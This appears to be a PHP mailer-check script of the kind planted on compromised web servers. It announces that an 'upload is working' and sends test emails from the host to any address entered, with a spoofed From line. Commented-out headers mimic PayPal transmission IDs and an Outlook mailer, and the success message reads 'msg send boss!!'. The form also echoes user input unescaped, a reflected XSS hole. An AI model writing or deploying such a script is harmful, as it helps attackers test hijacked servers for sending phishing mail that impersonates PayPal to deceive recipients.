<?php
error_reporting(0);
?>
Upload is <b><color>WORKING</color></b><br>
Check  Mailling ..<br>
<form method="post">
<input type="text" name="email" value="<?php print $_POST['email']?>"required >
<input type="submit" value="Send test >>">
</form>
<br>
<?php

if (!empty($_POST['email'])){
    $xx = rand();
	$SUBJ="email for test";
	$MSG="testing";
	$headers = "From: Aprilia <aprilbuttsworth@hotmail.com > ";
    //$headers .= "MIME-Version: 1.0\n";
     //$headers .= "Content-type: text/html; charset=iso-8859-1\n";
     //$headers .= "Content-Transfer-encoding: 8bit\n";
	 //$headers .= "PP-Correlation-Id: cdb6baca56483\n";
	 //$headers .= "X-PP-Email-transmission-Id: 24317fd0-85c7-11e8-9749-0242e879705c\n";
	 //$headers .= "X-PP-REQUESTED-TIME: 1531395097\n";
     //$headers .= "X-Email-Type-Id: PPX001529\n";
     //$headers .= "Message-ID: <test@test.com>\n";
     //$headers .= "X-Priority: 1\n";
     //$headers .= "X-Mailer: Microsoft Office Outlook, Build 11.0.5510\n";
    //$headers .= "X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441";

$to = $_POST['email'];
   $ok =  mail($to ,$SUBJ, $MSG, $headers);
    if ($ok) {
    echo "msg send boss!! to $to";
} else { 
    echo "Error";
}
}
?>